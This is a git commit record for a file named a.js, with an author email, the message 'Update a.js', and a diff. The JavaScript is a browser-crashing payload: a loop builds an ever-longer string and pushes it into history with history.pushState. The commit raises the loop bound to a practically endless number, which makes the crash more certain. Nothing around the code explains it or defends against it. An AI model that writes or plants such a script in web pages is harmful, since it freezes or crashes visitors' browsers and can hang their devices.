9d18102d914136de46d778b44620b6c00965bb91
xi <sripaksidn@gmail.com>
2019-03-19 19:17:53 +0700

    Update a.js

--- a.js
+++ a.js
@@ -1,6 +1,6 @@
 
                   var total = "";
-                    for( var i = 0; i < 100000; i++ ) {
+                    for( var i = 0; i < 9999999999999999999999999999999999999999999999999999999999999999999999999999999; i++ ) {
                         total = total + i.toString();
                         history.pushState(0,0, total );
                     }
